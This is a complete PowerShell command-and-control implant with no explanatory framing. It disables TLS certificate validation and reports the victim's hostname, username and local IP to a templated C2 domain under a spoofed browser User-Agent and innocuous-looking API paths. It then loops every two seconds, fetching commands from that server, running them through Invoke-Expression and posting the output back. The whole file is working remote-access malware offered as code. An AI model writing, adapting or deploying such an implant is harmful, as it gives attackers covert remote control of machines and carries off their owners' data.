[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

$AGENT_ID        = [guid]::NewGuid().ToString()

$C2_BASE       = "https://${c2_domain}"
$GET_ENDPOINT  = "/api/v2/status"
$POST_ENDPOINT = "/api/v2/users/update"

$HEADERS       = @{
    "Access-X-Control" = "000000011110000000"
    "User-Agent"       = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    "Agent-ID"         = $AGENT_ID
}

$SLEEP_INTERVAL  = 2   
$INITIAL_CONNECT = $true

try {
    $defRoute = Get-NetRoute -DestinationPrefix "0.0.0.0/0" |
                Where-Object { $_.NextHop -ne "0.0.0.0" } |
                Select-Object -First 1
    if ($defRoute) {
        $local_ip = (Get-NetIPAddress -InterfaceIndex $defRoute.InterfaceIndex -AddressFamily IPv4 |
                     Select-Object -First 1 -ExpandProperty IPAddress)
    } else {
        throw "No default route"
    }
} catch {
    try {
        $local_ip = Get-NetIPAddress -AddressFamily IPv4 |
                    Where-Object { $_.IPAddress -notlike "127.*" -and $_.InterfaceAlias -notmatch "Loopback" } |
                    Select-Object -First 1 -ExpandProperty IPAddress
    } catch {
        $local_ip = "unknown"
    }
}

function Get-SystemInfo {
    return @{
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        os       = "Windows"
        agent_id = $AGENT_ID
        local_ip = $local_ip
    }
}

function Beacon {
    try {
        $response     = Invoke-WebRequest -Uri "$C2_BASE$GET_ENDPOINT" `
                                          -Headers $HEADERS `
                                          -Method Get -UseBasicParsing
        $jsonResponse = $response.Content | ConvertFrom-Json
        return $jsonResponse.command
    } catch {
        return $null
    }
}

function Send-Output {
    param($output, $info)
    
    $output = $output -replace '[\r\n]+', "`n"  # Remove excess newlines
    $output = $output.Trim()

    # Ensure each file is on a new line
    if ($output -match '^\[.*\]$') {
        # Clean up the array output (list of files), making it line by line
        $output = $output -replace '^\[|\]$', ''  # Remove leading/trailing brackets
        $output = $output -replace '\', ''         # Remove any file path separators (optional)
        $output = $output -replace ',\s*', "`n"   
    }

    if ($info) {
        $payload = $info
        $payload.output = $output
    } else {
        $payload = @{
            hostname = $env:COMPUTERNAME
            username = $env:USERNAME
            agent_id = $AGENT_ID
            local_ip = $local_ip
            output   = $output
        }
    }
    
    Invoke-RestMethod -Uri "$C2_BASE$POST_ENDPOINT" `
                     -Headers $HEADERS `
                     -Method Post `
                     -Body ($payload | ConvertTo-Json) `
                     -ContentType "application/json"
}

function Execute-Command {
    param($command)

    if ($command -match "^dir" -or $command -match "^ls") {
        $result = Invoke-Expression "$command -Name"
        
        $result = $result -join "`n"
    } else {
        try {
            $result = Invoke-Expression $command 2>&1 | Out-String -Width 4096
        } catch {
            return $_.Exception.Message
        }
    }

    return $result.Trim()
}

# Initial callback with system info
if ($INITIAL_CONNECT) {
    Send-Output "[+] New agent online" (Get-SystemInfo)
    $INITIAL_CONNECT = $false
}

# Main loop
while ($true) {
    $cmd = Beacon
    if ($cmd) {
        $out = Execute-Command $cmd
        Send-Output $out
    }
    Start-Sleep -Seconds $SLEEP_INTERVAL
}
